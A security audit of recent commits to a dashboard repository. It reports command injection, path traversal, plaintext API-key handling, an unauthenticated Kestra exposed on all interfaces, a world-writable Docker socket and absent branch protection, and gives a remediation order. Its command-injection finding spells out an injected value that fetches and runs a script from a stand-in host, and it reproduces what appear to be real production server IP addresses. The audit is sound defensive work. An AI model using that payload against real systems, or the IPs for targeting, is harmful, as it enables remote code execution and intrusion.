# Technical Audit — Changes Since Last vvJerome-Authored Merge

**Date:** 2026-07-27
**Scope:** All commits on `main` after `a193d34` (last PR merged by vvJerome — "Merge pull request #1 from vvJerome/feat/multiple-vps") through `d34cad6` (current `main` HEAD).
**Repo:** `vvJerome/us-z-dashboard` (public, no branch protection, no CODEOWNERS).

## Author summary

| Commit | Author (name/email) | GitHub login | Type | Reviewed? |
|---|---|---|---|---|
| `e7a2d74`, `4005df3` | chescaphobic / sara@viableview.com | saraphobic | PR #1 commits | merged by vvJerome, **0 reviews recorded** |
| `858698f`, `263c045` | chescaphobic / sara@viableview.com | saraphobic | PR #2 commits | merged by vvJerome, **0 reviews recorded** |
| `62805c9` | chescaphobic / sara@viableview.com | saraphobic | PR #3 commit | **self-merged by saraphobic**, 0 reviews, merged 31s after opening |
| `38b81ac` "feat: dynamic api keys (in statebridge)" | chescaphobic / sara@viableview.com | — | **direct push to `main`, no PR** |
| `d34cad6` "update yml" | chescaphobic / sara@viableview.com | — | **direct push to `main`, no PR** |

**Governance findings (see Infra/Workflow below for detail):** `main` has zero branch protection (`404 Branch not protected`), one PR was authored *and* merged by the same person with no review, and two commits landed on `main` with no PR at all. Every line audited below shipped without a second pair of eyes.

---

## 1. Code (backend / pipeline)

| Severity | File | Finding |
|---|---|---|
| **CRITICAL** | [backend/services/pipeline_ssh.py:203](backend/services/pipeline_ssh.py#L203), [backend/routers/vps.py:28-46](backend/routers/vps.py#L28-L46) | **Command injection.** `POST /vps` accepts `data_dir` as a raw unvalidated string (`schemas/vps.py`). It flows unescaped into `db_path = f"{data_dir}/jobs/{job_id}/v2/pipeline.db"`, which is then interpolated directly into a shell command executed over SSH: `f'/usr/bin/sqlite3 -json "{db_path}" "{escaped}"'`. Only the `sql` half is quote-escaped — `db_path` is not. A `data_dir` such as `/data"; curl evil.sh\|sh; echo "` achieves arbitrary remote code execution on the pipeline VPS via the backend's SSH credentials. This is exactly the path-handling defect `.claude/rules/security.md` prohibits ("all file paths derived from user input... must be validated"), except here it reaches a shell, not just the filesystem. |
| **CRITICAL** | [backend/routers/zerobounce.py:29-38](backend/routers/zerobounce.py#L29-L38) | **Path traversal.** The uploaded `file.filename` is checked only for extension, never for `..`, then joined directly: `input_path = input_dir / filename`. `security.md` explicitly requires rejecting any path containing `..` — that check is absent here (it exists for other upload paths in the codebase, so the omission is a regression, not a gap in the original design). |
| **HIGH** | [backend/schemas/jobs.py:15-16](backend/schemas/jobs.py#L15-L16), [backend/routers/jobs.py:44-62](backend/routers/jobs.py#L44-L62) | **Third-party API keys stored and echoed in plaintext.** `serper_api_key` / `zuhal_api_key` are accepted as plain job-creation params, stored verbatim in the `Job.config` JSON column, and `JobResponse.config: dict` serializes that column straight back out. Any unauthenticated caller of `GET /jobs` or `GET /jobs/{id}` (auth is deferred per ADR, but that's a separate, accepted risk — plaintext-credential-in-response is not) gets the raw key back. |
| **HIGH** | [backend/services/zerobounce_runner.py:50-58](backend/services/zerobounce_runner.py#L50-L58) | **Credential logging.** `logger.warning("ZeroBounce error for %s: %s", email, exc)` logs the exception object directly. `aiohttp`'s `ClientResponseError` (raised by `raise_for_status()`) stringifies to include the full request URL, and the request was built with `params={"api_key": api_key, ...}` — so `ZEROBOUNCE_API_KEY` lands in application logs on every transient API error. Direct violation of `security.md`: "Never log ... any credential — even at DEBUG level." |
| MEDIUM | [backend/services/zerobounce_runner.py:129-143](backend/services/zerobounce_runner.py#L129-L143) | Rows are processed with `asyncio.gather` over all rows at once (bounded only by a semaphore of 10) and written as each request completes — **output row order does not match input order**, and rate-limited/failed rows are written as `"error"` with no retry and no failure-rate threshold. A job can complete as `COMPLETED` even if most rows errored from rate-limiting, with no signal to the user beyond per-row `"error"` values. |
| MEDIUM | [dashboard/src/pages/MonitorPage.tsx](dashboard/src/pages/MonitorPage.tsx) | **625 lines — exceeds the project's hard 600-LOC file limit** (`CLAUDE.md`, `coding-standards.md`). Needs to be split before further work lands on it. |
| LOW | [backend/services/metrics_cache.py:10-13](backend/services/metrics_cache.py#L10-L13) | In-memory `_cache` / `_locks` dicts key by `job_id` and are never evicted for jobs that never reach a terminal state via `invalidate()` (e.g. cancelled-without-sync edge cases) — slow unbounded growth for a long-lived process. Low impact, worth a TTL sweep if the process is expected to run for weeks. |

## 2. Components (dashboard/React)

| Severity | File | Finding |
|---|---|---|
| MEDIUM | [dashboard/src/hooks/useJobMetrics.ts:8](dashboard/src/hooks/useJobMetrics.ts#L8) | `refetchInterval: 2000` — the new Metrics/Live view polls every **2 seconds**, deviating from ADR-002's documented 10-second polling standard with no ADR update to justify or record the exception. |
| MEDIUM | [dashboard/package.json:15](dashboard/package.json#L15) | New dependency `chart.js` added for `MetricsCharts.tsx`. `project-stack.md` requires a new ADR before introducing alternatives to the established stack; no ADR accompanies this addition. |
| LOW | [dashboard/src/components/ZeroBounceModal.tsx:52](dashboard/src/components/ZeroBounceModal.tsx#L52) vs [backend/routers/zerobounce.py:20](backend/routers/zerobounce.py#L20) | Client `accept=".csv,.txt"` but the backend also accepts `.jsonl` — inconsistent, and unlike `NewJobModal` (which testing.md documents as validating both extension and size client-side), `ZeroBounceModal` does no client-side size pre-check before uploading up to the 100 MB server limit. |

## 3. Config

| Severity | File | Finding |
|---|---|---|
| HIGH | `.env.template` | **Not updated.** This changeset introduces `ZEROBOUNCE_API_KEY` (required — the job hard-fails without it), `VPS2_SSH_KEY_PATH`, and `VPS3_SSH_KEY_PATH`, none of which appear in `.env.template`. A deploy following the template alone will silently miss `ZEROBOUNCE_API_KEY`. |
| MEDIUM | [kestra/flows/run-scraper.yml:16-25](kestra/flows/run-scraper.yml#L16-L25) | `serper_api_key` / `zuhal_api_key` flow inputs are declared `type: STRING`. Kestra has a purpose-built `type: SECRET` for exactly this case (masked in the execution UI and logs). Using `STRING` means both keys render in plaintext in Kestra's execution inputs panel to anyone with Kestra UI access — compounding the plaintext-storage issue found in the backend. |
| MEDIUM | [kestra/kestra.yml](kestra/kestra.yml) (new file) | This file is never mounted or referenced anywhere in `docker-compose.yml` (no volume mount, no `MICRONAUT_CONFIG_FILES`/`KESTRA_CONFIG_PATH` pointing at it). It is dead configuration — the same settings it declares (`storage.type: local`, `basePath: /app/storage`) are already set via env vars on the `kestra` service. Confusing to a future reader who assumes it's live. |
| LOW | [scripts/setup-pipeline-image.sh:107-119](scripts/setup-pipeline-image.sh#L107-L119) | This script embeds a **second, drifted copy** of the `run-scraper.yml` flow (missing the `serper_api_key`/`zuhal_api_key` inputs the repo's copy has) instead of deploying the actual file from `kestra/flows/`. Two sources of truth for the same flow will diverge further over time — violates the project's own DRY rule. |

## 4. Test

| Severity | Finding |
|---|---|
| **CRITICAL (process)** | **Zero test files were touched in this entire changeset.** ~700 new lines of backend (`zerobounce.py`, `zerobounce_runner.py`, `metrics.py`, `metrics_cache.py`, `pipeline_ssh.py`) and ~1240 new lines of dashboard code (`MonitorPage.tsx`, `MetricsCharts.tsx`, `ZeroBounceModal.tsx`, `ZeroBounceRow.tsx`, hooks, api clients) shipped with no corresponding tests, directly against `testing.md`'s explicit per-component requirements and 80% coverage target. This is also exactly how the command-injection and path-traversal bugs above went unnoticed — there is no test asserting rejected paths for either upload endpoint. |

## 5. Documentation

| Severity | File | Finding |
|---|---|---|
| HIGH | [docs/session-handoff-multi-vps.md](docs/session-handoff-multi-vps.md) | This is a raw Claude Code **session-handoff note** (an AI-agent internal artifact — "Previous Claude Code session: `cb81717a-...` (died at 100% context)") committed into `docs/` in a **public** repository. It contains the real production IP addresses of all three VPS instances (`23.238.94.175`, `23.238.97.172`, `23.238.100.4`) and their SSH key filenames — operational reconnaissance information now publicly visible in git history. It also points readers at `~/.claude/projects/-Users-saravv-Documents-us-z-dashboard/memory/...`, a path on one engineer's local machine that nobody else can resolve. This file should not have been committed as-is; at minimum the IPs need to be redacted/rotated and the file moved out of the versioned, public `docs/` tree. |

## 6. Infra / Workflow

| Severity | File | Finding |
|---|---|---|
| **CRITICAL** | `gh api repos/.../branches/main/protection` → `404` | **`main` has no branch protection whatsoever** on a public repo. This is what allowed a self-authored-and-self-merged PR (#3, merged 31 seconds after opening) and two commits pushed directly to `main` with no PR at all (`38b81ac`, `d34cad6`). None of the changes in this audit received a code review. |
| **CRITICAL** | [scripts/setup-pipeline-image.sh:66-68, 108](scripts/setup-pipeline-image.sh#L66-L68) | The VPS provisioning script binds Kestra as **`"8080:8080"` (all interfaces)** with `KESTRA_SERVER_BASIC_AUTH_ENABLED: "false"`, and even prints the public URL back to the operator (`Kestra UI : http://<host>:8080`). `security.md` states in this exact repo: *"Kestra must bind port 8080 to `127.0.0.1` only — never `0.0.0.0:8080`."* This script does the opposite for every VPS it provisions (VPS#2, VPS#3 per the session-handoff doc). Combined with the Docker-socket mount into that same Kestra container, this exposes an **unauthenticated path to full host takeover** on any VPS provisioned with this script. |
| **CRITICAL** | [scripts/setup-pipeline-image.sh:44](scripts/setup-pipeline-image.sh#L44) | `chmod 666 /var/run/docker.sock` — makes the Docker socket **world-writable** on the host, i.e. any local process (not just the Kestra container) gets root-equivalent control over Docker. `security.md`'s "Docker socket restricted to Kestra service only" is defeated outright by this permission bit, independent of which container mounts it. |
| HIGH | [kestra/vps-wrapper/Dockerfile](kestra/vps-wrapper/Dockerfile), [kestra/vps-wrapper/patch_zuhal.py](kestra/vps-wrapper/patch_zuhal.py) | Three real pipeline bugs — a call to a removed `_run_bbops` function, an infinite-retry storm on Zuhal HTTP 429s, and a wrong column name (`zuhal_score` vs `confidence_score`) in `merge_outputs.py` — are fixed **only** via `sed`/text-splicing patches baked into a wrapper Docker image (`FROM ghcr.io/vvjerome/us-z-3:latest` + patches), built and deployed exclusively through `setup-pipeline-image.sh` onto VPS#2/#3 (`pullPolicy: NEVER`, image `us-z-3-local:latest`). None of these fixes were merged into the actual `us-z-3` pipeline source or released through the documented CI/CD path (ADR-005). Consequence: **VPS#1 (which pulls the real GHCR image per `kestra/flows/run-scraper.yml`) still runs all three unfixed bugs**, while VPS#2/#3 run a hand-patched fork that no one reviewed, no test covers, and that will silently stop applying if the upstream source ever shifts the matched line/indentation. The fleet is running three different, undocumented variants of the same pipeline. |
| MEDIUM | [scripts/setup-pipeline-image.sh:82](scripts/setup-pipeline-image.sh#L82) | Hardcoded `POSTGRES_PASSWORD: kestrapass` written into the remote `docker-compose.yml` this script generates — a hardcoded, weak, guessable credential checked into a script under version control, contradicting `security.md`'s "never hardcode credentials." |
| LOW | [scripts/setup-pipeline-image.sh:33](scripts/setup-pipeline-image.sh#L33), throughout | `StrictHostKeyChecking=no` on every SSH/SCP call to production hosts disables MITM protection on first connect; `curl -fsSL https://get.docker.com \| sh` piped-to-shell with no checksum/signature verification is a supply-chain trust-on-first-use pattern worth reconsidering even though it's common practice. |

---

## Priority remediation order

1. **Command injection** in `pipeline_ssh.py` (validate/whitelist `data_dir`, never interpolate into a shell string) — CRITICAL, exploitable today via `POST /vps`.
2. **Kestra exposed on `0.0.0.0:8080` unauthenticated + world-writable docker.sock** on VPS#2/#3 — CRITICAL, re-provision or patch both hosts now; rotate any credentials that were reachable.
3. **Path traversal** on the ZeroBounce upload endpoint — CRITICAL, add the same `..` check used elsewhere.
4. **Rotate `SERPER_API_KEY` / `ZUHAL_API_KEY` / `ZEROBOUNCE_API_KEY`** — they've been logged, stored in plaintext, returned over an unauthenticated API, and shipped to an unauthenticated public-facing Kestra instance.
5. **Turn on branch protection on `main`** (require PR + ≥1 review, block direct pushes) — this is the root cause that let every other item above ship unreviewed.
6. Redact the real VPS IPs from `docs/session-handoff-multi-vps.md` (or remove the file from the public repo and relocate it internally).
7. Backfill tests for all new backend/dashboard code before extending it further (testing.md coverage targets).
8. Reconcile the pipeline bug fixes in `patch_zuhal.py`/Dockerfile back into the actual `us-z-3` source so all VPS instances run the same, reviewed code.
